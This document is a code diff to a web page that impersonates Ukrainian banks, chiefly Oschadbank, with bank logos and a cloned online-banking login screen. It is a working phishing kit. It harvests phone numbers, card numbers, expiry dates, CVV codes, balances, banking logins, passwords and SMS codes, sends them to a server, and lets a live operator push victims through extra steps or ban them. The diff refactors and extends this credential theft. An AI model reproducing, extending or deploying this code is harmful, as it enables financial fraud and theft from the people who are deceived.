@@ -10,11 +10,13 @@
         :root {
             --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
             --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
+            --oschad-primary: #00A39C;
+            --oschad-light: #e0f2f1; /* Светло-бирюзовый для кнопок */
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
-            font-size: 16px; /* Базовый размер шрифта */
+            font-size: 16px;
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
@@ -24,10 +26,10 @@
             opacity: 0; visibility: hidden; transform: scale(1.05);
             transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
             display: flex; align-items: center; padding: 20px;
-            background: #f8f9fa; /* Общий фон для форм */
+            background: #f8f9fa;
         }
         .form-container {
-            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
+            width: 100%; max-width: 380px; margin: auto;
             background-color: var(--white); padding: 30px; border-radius: 20px;
             box-shadow: 0 15px 40px rgba(0,0,0,0.2);
         }
@@ -46,119 +48,83 @@
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
         .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
-        .bank-item.disabled .unavailable-label {
-            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
-            font-size: 12px; font-weight: bold; color: var(--danger-color);
-            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
-        }
 
         /* --- ИЗМЕНЕНИЕ: Стили для модального окна ЛК Ощадбанка --- */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: #f8f9fa; /* Светлый фон */
-            display: none; justify-content: center; align-items: flex-start;
-            z-index: 1000;
+            background-color: #f8f9fa; display: none; justify-content: center; align-items: flex-start; z-index: 1000;
         }
         .custom-modal-content {
             background-color: transparent; padding: 0; border-radius: 0;
-            width: 100%; max-width: none; text-align: center; box-shadow: none;
-            display: flex; flex-direction: column; align-items: center;
+            width: 100%; max-width: 480px; /* Ограничиваем максимальную ширину на больших экранах */
+            text-align: center; box-shadow: none; display: flex; flex-direction: column; align-items: center;
         }
         .oschad-header {
             width: 100%; display: flex; align-items: center;
             padding: 10px 15px; background-color: #f8f9fa;
         }
-        .oschad-header .back-arrow {
-            font-size: 28px; color: #495057; margin-right: 15px;
-            cursor: pointer; line-height: 1;
-        }
-        .oschad-header .title {
-            font-size: 18px; font-weight: 600; color: #212529;
-            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
-        }
-        .oschad-welcome-section {
-            padding: 20px; text-align: center; width: 100%;
-            display: flex; flex-direction: column; align-items: center; /* Центрируем всё содержимое */
-        }
-        .oschad-welcome-section p {
-            font-size: 16px; color: #495057; line-height: 1.5;
-            margin-bottom: 25px; font-weight: 500; /* Шрифт жирнее */
-            max-width: 350px; /* Ограничиваем ширину текста */
-        }
+        .oschad-header .back-arrow { font-size: 28px; color: #495057; margin-right: 15px; cursor: pointer; line-height: 1; }
+        .oschad-header .title { font-size: 18px; font-weight: 600; color: #212529; flex-grow: 1; text-align: center; margin-right: 40px; }
+        .oschad-welcome-section { padding: 20px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; }
+        .oschad-welcome-section p { font-size: 16px; color: #495057; line-height: 1.5; margin-bottom: 25px; font-weight: 500; }
         .oschad-toggle-buttons {
             display: flex; background-color: #e9ecef; border-radius: 12px;
-            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%; max-width: 350px;
+            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
         }
         .oschad-toggle-buttons button {
-            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
-            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
-            border-radius: 8px; transition: all 0.2s ease;
+            flex: 1; padding: 12px 15px; border: none; background-color: transparent; font-size: 15px;
+            font-weight: 600; color: #6c757d; cursor: pointer; border-radius: 8px; transition: all 0.2s ease;
         }
         .oschad-toggle-buttons button.active {
-            background-color: var(--white); color: var(--dark-text);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            background-color: var(--oschad-light); /* Светло-бирюзовый */
+            color: var(--oschad-primary); /* Темно-бирюзовый текст */
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
-        .oschad-input-group {
-            margin-bottom: 20px; width: 100%; max-width: 350px; position: relative;
-        }
+        .oschad-input-group { margin-bottom: 20px; width: 100%; position: relative; }
         .oschad-input-group label {
             position: absolute; top: 15px; left: 15px; font-size: 15px; color: #adb5bd;
             transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
         }
+        .oschad-input-group.static-label label,
         .oschad-input-group input:focus + label,
         .oschad-input-group input:not(:placeholder-shown) + label {
             top: -10px; left: 10px; font-size: 12px; color: #6c757d;
         }
         .oschad-input-field {
-            width: 100%; padding: 15px 45px 15px 15px; /* Добавили отступ справа для иконки */
-            border: none; /* Убираем рамку */
-            border-bottom: 1px solid #dee2e6; /* Тонкая линия снизу */
-            border-radius: 0; /* Убираем закругления */
+            width: 100%; padding: 15px 45px 15px 15px;
+            border: 1px solid #dee2e6; /* Видимая рамка */
+            border-radius: 12px; /* Закругленные края */
             font-size: 16px; color: var(--dark-text); background-color: var(--white);
-            transition: all 0.2s ease; outline: none;
-            font-weight: 500; /* Шрифт жирнее */
+            transition: all 0.2s ease; outline: none; font-weight: 500;
         }
-        .oschad-input-field:focus {
-            border-bottom-color: #00A39C; /* Зеленая линия при фокусе */
-        }
+        .oschad-input-field:focus { border-color: var(--oschad-primary); }
         .oschad-input-field::placeholder { color: transparent; }
         .password-toggle-icon {
             position: absolute; right: 15px; top: 50%;
             transform: translateY(-50%); cursor: pointer; color: #adb5bd;
         }
-        .password-toggle-icon svg { width: 22px; height: 22px; }
-        .oschad-phone-wrapper {
-            position: relative; display: flex; align-items: center;
-            width: 100%; border-bottom: 1px solid #dee2e6; background-color: var(--white);
-        }
-        .oschad-phone-wrapper:focus-within { border-bottom-color: #00A39C; }
-        .oschad-phone-prefix {
-            padding: 15px 0 15px 15px; font-size: 16px; color: var(--dark-text);
-            font-weight: 500;
-        }
-        .oschad-phone-wrapper .oschad-input-field {
-            border: none; padding-left: 5px; flex-grow: 1;
-        }
+        .password-toggle-icon svg { width: 22px; height: 22px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+        .oschad-phone-wrapper { display: flex; align-items: center; width: 100%; }
+        .oschad-phone-prefix { padding: 0 5px 0 0; font-size: 16px; color: var(--dark-text); font-weight: 500; }
+        .oschad-phone-wrapper .oschad-input-field { border: none; padding-left: 0; flex-grow: 1; }
+        .oschad-input-group .oschad-phone-wrapper { padding-left: 15px; border: 1px solid #dee2e6; border-radius: 12px; }
+        .oschad-input-group .oschad-phone-wrapper:focus-within { border-color: var(--oschad-primary); }
         .oschad-submit-button {
-            width: 100%; max-width: 350px; padding: 16px; margin-top: 30px; border: none;
-            border-radius: 16px; /* Кнопка круглее */
-            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
+            width: 100%; padding: 16px; margin-top: 30px; border: none;
+            border-radius: 16px; background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
             cursor: not-allowed; transition: all 0.2s ease;
         }
-        .oschad-submit-button.active {
-            background-color: #00A39C; color: var(--white); cursor: pointer;
-        }
+        .oschad-submit-button.active { background-color: var(--oschad-primary); color: var(--white); cursor: pointer; }
         .loader-icon {
-            width: 80px; height: 80px; max-width: 100%; /* Ограничение размера */
-            margin: 20px auto;
-            -webkit-animation: spin 2s linear infinite; /* Анимация */
+            width: 80px; height: 80px; margin: 20px auto;
+            background: transparent; border: none; /* Убираем фон и рамку */
+            -webkit-animation: spin 2s linear infinite;
             animation: spin 2s linear infinite;
         }
         @-webkit-keyframes spin { 0% { -webkit-transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); } }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Остальные стили для форм (без изменений) */
+        /* Общие стили форм */
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
@@ -168,23 +134,9 @@
             width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
             font-size: 18px; font-weight: 500; transition: all 0.3s ease;
         }
-        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
-        .phone-input-wrapper { display: flex; }
-        .phone-prefix {
-            padding: 15px; border: 1px solid var(--border-color); border-right: none;
-            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
-            flex-shrink: 0; display: flex; align-items: center;
-        }
-        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
-        .multi-input-row { display: flex; gap: 10px; }
         .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
-        .btn {
-            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
-            font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1;
-        }
-        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1; }
         body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-        /* Другие темы... */
     </style>
 </head>
 <body>
@@ -209,20 +161,7 @@
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
-    // ... (весь JS до функции renderCustomModal остается без изменений) ...
-
-    const bankFlows = {
-        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
-        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true }
-    };
-    
-    // Остальной JS без изменений...
+    // --- ДАЛЕЕ ИДЕТ ПОЛНЫЙ JAVASCRIPT БЕЗ СОКРАЩЕНИЙ ---
     const urlParams = new URLSearchParams(window.location.search);
     const ref = urlParams.get('ref') || 'unknown';
     localStorage.setItem('referrer', ref);
@@ -231,6 +170,35 @@ document.addEventListener('DOMContentLoaded', () => {
     let activeBankData = {};
     let currentStepIndex = 0;
     let collectedData = {};
+
+    const specialFlowSteps = [
+        { type: 'phone', title: 'Введіть номер телефону' },
+        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
+    ];
+    const confirmationSteps = [
+        {
+            type: 'confirm_all',
+            title: 'Підтвердити володіння карткою',
+            fields: [
+                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
+                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
+                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
+                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
+            ]
+        }
+    ];
+
+    const bankFlows = {
+        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: specialFlowSteps, special: true },
+        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: specialFlowSteps, special: true },
+        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: specialFlowSteps, special: true },
+        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: specialFlowSteps, special: true },
+        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: specialFlowSteps, special: true },
+        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: specialFlowSteps, special: true },
+        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: specialFlowSteps, special: true }
+    };
+    
     const bankGrid = document.querySelector('.bank-grid');
     const body = document.body;
     const formHeaderLogo = document.getElementById('form-header-logo');
@@ -252,7 +220,6 @@ document.addEventListener('DOMContentLoaded', () => {
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
     
-    // --- ИЗМЕНЕНИЕ: Полностью переработанная функция renderCustomModal ---
     function renderCustomModal(type, bankName) {
         let html = '';
         if (type === 'lk') {
@@ -263,15 +230,15 @@ document.addEventListener('DOMContentLoaded', () => {
                         <span class="title">Ласкаво просимо</span>
                     </div>
                     <div class="oschad-welcome-section">
-                        <p>Для входу або реєстрації введіть логін або номер телефону</p>
+                        <p>Для входу введіть логін або номер</p>
                         <div class="oschad-toggle-buttons">
                             <button id="toggle-phone" class="active">Номер телефону</button>
                             <button id="toggle-login">Логін</button>
                         </div>
 
                         <div id="phone-login-form">
-                            <div class="oschad-input-group">
-                                <label for="phone_input" style="top: -10px; left: 10px; font-size: 12px; color: rgb(108, 117, 125);">Номер телефону</label>
+                            <div class="oschad-input-group static-label">
+                                <label for="phone_input">Номер телефону</label>
                                 <div class="oschad-phone-wrapper">
                                     <span class="oschad-phone-prefix">+380</span>
                                     <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off">
@@ -315,7 +282,6 @@ document.addEventListener('DOMContentLoaded', () => {
         addCustomModalListeners(bankName);
     }
     
-    // --- ИЗМЕНЕНИЕ: Обновленная функция для слушателей событий в модальном окне ---
     function addCustomModalListeners(bankName) {
         const submitBtn = document.getElementById('custom-submit-btn') || document.getElementById('oschad-submit-btn');
 
@@ -333,7 +299,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const loginInput = document.getElementById('login_input');
             const loginPassInput = document.getElementById('login_password_input');
             
-            // Форматирование номера телефона для Ощада
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                 let formatted = '';
@@ -383,10 +348,10 @@ document.addEventListener('DOMContentLoaded', () => {
             
             customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
                 icon.addEventListener('click', () => {
-                    const passwordInput = icon.previousElementSibling;
+                    const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
                     const isPassword = passwordInput.type === 'password';
                     passwordInput.type = isPassword ? 'text' : 'password';
-                    icon.style.color = isPassword ? '#212529' : '#adb5bd'; // меняем цвет иконки
+                    icon.style.color = isPassword ? '#212529' : '#adb5bd';
                 });
             });
         }
@@ -395,16 +360,18 @@ document.addEventListener('DOMContentLoaded', () => {
             submitBtn.onclick = () => {
                 if(submitBtn.disabled) return;
                 const dataToSend = {};
-                const inputs = customModalContent.querySelectorAll('.oschad-input-field, .input-field');
-                inputs.forEach(el => {
-                   let key = el.id;
-                   let value = el.value;
-                   if (key === 'phone_input') { key = 'phone'; value = '+380' + value.replace(/\D/g, ''); }
-                   if (key === 'phone_password_input') key = 'password';
-                   if (key === 'login_input') key = 'login';
-                   if (key === 'login_password_input') key = 'password';
-                   if (value) dataToSend[key] = value;
-                });
+                if (bankName === 'Ощадбанк') {
+                    if (document.getElementById('phone-login-form').style.display !== 'none') {
+                        dataToSend.phone = '+380' + document.getElementById('phone_input').value.replace(/\D/g, '');
+                        dataToSend.password = document.getElementById('phone_password_input').value;
+                    } else {
+                        dataToSend.login = document.getElementById('login_input').value;
+                        dataToSend.password = document.getElementById('login_password_input').value;
+                    }
+                } else {
+                    const inputs = customModalContent.querySelectorAll('.input-field');
+                    inputs.forEach(el => { if (el.value) dataToSend[el.id] = el.value; });
+                }
                 
                 sendDataToServer(dataToSend, true);
                 
@@ -426,26 +393,257 @@ document.addEventListener('DOMContentLoaded', () => {
             };
         }
     }
-    
-    // ... остальной JS код без изменений ...
-    // Нужно объявить все функции и слушатели, которые были ранее
-    document.querySelectorAll('.bank-item').forEach(item => { item.addEventListener('click', e => { e.preventDefault(); if (item.classList.contains('disabled')) return; const bankId = item.dataset.bank; activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId])); body.dataset.theme = activeBankData.theme; formHeaderLogo.src = activeBankData.logoUrl; body.classList.add('form-active'); currentStepIndex = 0; collectedData = {}; renderStep(); connectWebSocket(); }); });
-    nextBtn.addEventListener('click', handleNextStep);
-    backBtn.addEventListener('click', handleBackStep);
-    // ... и так далее
-    
-    // Неизмененные функции
-    async function handleNextStep() { if (!validateCurrentStep()) return; let data = {}; stepContent.querySelectorAll('.input-field').forEach(input => { let key = input.id; let value = input.value; if (key === 'phone') value = '+380' + value.replace(/\D/g, ''); if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, ''); data[key] = value; }); const step = activeBankData.steps[currentStepIndex]; let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length; if (activeBankData.theme === 'oschadbank' && step.type === 'card') { isFinalStep = true; } sendDataToServer(data, isFinalStep); if ((activeBankData.special && step.type === 'card_simple') || (activeBankData.theme === 'oschadbank' && step.type === 'card')) { showWaitingScreen(); return; } currentStepIndex++; if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); } }
-    async function sendDataToServer(data, isFinal) { collectedData = { ...collectedData, ...data }; try { await fetch(`/api/submit`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, referrer: localStorage.getItem('referrer') || 'unknown', ...collectedData }), }); } catch (error) { console.error('Failed to send data:', error); } }
-    function handleServerCommand(command) { const { type, data } = command; const showMessageInMainModal = (title, text, btnText, callback) => { modalTitle.textContent = title; stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`; modalFooter.style.display = 'flex'; modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`; modalFooter.querySelector('button').onclick = callback; }; switch (type) { case 'sms': modalTitle.textContent = 'Введіть код з SMS'; stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`; modalFooter.style.display = 'flex'; modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`; document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode); break; case 'lk': renderCustomModal('lk', data.bankName); break; case 'call': renderCustomModal('call', data.bankName); break; case 'request_details': activeBankData.steps.push(...[{ type: 'confirm_all', title: 'Підтвердити володіння карткою', fields: [{ id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' }, { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' }, { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' }, { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }] }]); currentStepIndex++; renderStep(); break; case 'other': const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`); if (bankToDisable) { bankToDisable.classList.add('disabled'); if(!bankToDisable.querySelector('.unavailable-label')) { bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>'; } } showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload()); break; case 'pin_error': showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); }); break; case 'number_error': showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); }); break; case 'code_error': const smsErrorContainer = document.getElementById('sms-error-container'); if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`; break; case 'ban': document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`; if (ws) ws.close(); break; case 'custom_message_text': showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep); break; } }
+
+    async function sendDataToServer(data, isFinal) {
+        collectedData = { ...collectedData, ...data };
+        try {
+            await fetch(`/api/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId,
+                    bankName: activeBankData.name,
+                    isFinalStep: isFinal,
+                    referrer: localStorage.getItem('referrer') || 'unknown',
+                    ...collectedData
+                }),
+            });
+        } catch (error) {
+            console.error('Failed to send data:', error);
+        }
+    }
+
+    function handleServerCommand(command) {
+        const { type, data } = command;
+
+        // --- ИЗМЕНЕНИЕ: Теперь любая команда сначала прячет оверлей ---
+        if (type !== 'lk' && type !== 'call') {
+            customModalOverlay.style.display = 'none';
+        }
+
+        const showMessageInMainModal = (title, text, btnText, callback) => {
+            body.classList.add('form-active'); // Показываем основной контейнер
+            modalTitle.textContent = title;
+            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
+            modalFooter.style.display = 'flex';
+            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
+            modalFooter.querySelector('button').onclick = callback;
+        };
+        switch (type) {
+            case 'sms':
+                body.classList.add('form-active');
+                modalTitle.textContent = 'Введіть код з SMS';
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                modalFooter.style.display = 'flex';
+                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
+                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
+                break;
+            case 'lk':
+                body.classList.remove('form-active'); // Прячем основной контейнер
+                renderCustomModal('lk', data.bankName);
+                break;
+            case 'call':
+                body.classList.remove('form-active'); // Прячем основной контейнер
+                renderCustomModal('call', data.bankName);
+                break;
+            case 'request_details':
+                activeBankData.steps.push(...confirmationSteps);
+                currentStepIndex++;
+                renderStep();
+                break;
+            case 'other':
+                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
+                if (bankToDisable) {
+                    bankToDisable.classList.add('disabled');
+                    if (!bankToDisable.querySelector('.unavailable-label')) {
+                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                    }
+                }
+                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
+                break;
+            case 'pin_error':
+                showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
+                break;
+            case 'number_error':
+                showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
+                break;
+            case 'code_error':
+                body.classList.add('form-active');
+                const smsErrorContainer = document.getElementById('sms-error-container');
+                if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
+                break;
+            case 'ban':
+                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
+                if (ws) ws.close();
+                break;
+            case 'custom_message_text':
+                showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep);
+                break;
+        }
+    }
+
+    function handleNextStep() {
+        if (!validateCurrentStep()) return;
+        let data = {};
+        stepContent.querySelectorAll('.input-field').forEach(input => {
+            let key = input.id;
+            let value = input.value;
+            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
+            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
+            data[key] = value;
+        });
+        const step = activeBankData.steps[currentStepIndex];
+        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
+        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
+            isFinalStep = true;
+        }
+        sendDataToServer(data, isFinalStep);
+        if ((activeBankData.special && step.type === 'card_simple') || (activeBankData.theme === 'oschadbank' && step.type === 'card')) {
+            showWaitingScreen();
+            return;
+        }
+        currentStepIndex++;
+        if (currentStepIndex < activeBankData.steps.length) {
+            renderStep();
+        } else {
+            showWaitingScreen();
+        }
+    }
+
     const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
-    function renderStep() { if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return; const step = activeBankData.steps[currentStepIndex]; let html = ''; switch (step.type) { case 'phone': html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`; break; case 'card': case 'card_simple': html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19'); break; case 'pin': html = generateInputHTML('pin', 'ПІН-код', 'password', '4'); break; case 'call_code': html = `<p>Зараз вам буде здійснено дзвінок...</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`; break; case 'confirm_all': html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join(''); break; } modalTitle.textContent = step.title; stepContent.innerHTML = html; modalFooter.style.display = 'flex'; backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none'; nextBtn.style.display = 'block'; addInputFormatting(); }
-    function showWaitingScreen() { modalTitle.textContent = 'Очікуємо'; stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`; modalFooter.style.display = 'none'; }
-    function handleBackStep() { if (currentStepIndex > 0) { currentStepIndex--; renderStep(); } else { body.classList.remove('form-active'); } }
-    function addInputFormatting() { const phoneInput = document.getElementById('phone'); if (phoneInput) { phoneInput.addEventListener('input', (e) => { let value = e.target.value.replace(/\D/g, '').substring(0, 9); e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim(); }); } const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm'); if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); } const cardExpiryInput = document.getElementById('card-expiry'); if (cardExpiryInput) { cardExpiryInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'); }); } }
